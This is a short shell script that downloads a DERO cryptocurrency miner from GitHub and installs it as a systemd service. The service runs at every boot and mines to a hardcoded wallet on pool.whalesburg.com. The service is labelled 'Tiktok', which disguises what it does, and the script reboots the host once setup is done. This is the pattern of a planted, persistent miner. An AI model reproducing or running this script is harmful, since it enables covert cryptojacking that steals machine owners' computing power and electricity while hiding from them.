cd /home
sudo wget https://github.com/whalesburg/dero-stratum-miner/releases/download/v1.0.2/dero-stratum-miner-v1.0.2-linux-amd64.tar.gz
sudo apt update
sudo tar xvzf dero-stratum-miner-v1.0.2-linux-amd64.tar.gz
sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/dero-stratum-miner -r pool.whalesburg.com:4300 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmx50ny2fyrcths7s0jwk.thucnvv\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
sudo systemctl daemon-reload
sudo systemctl enable deroz.service
echo "Setup completed!"
sudo reboot
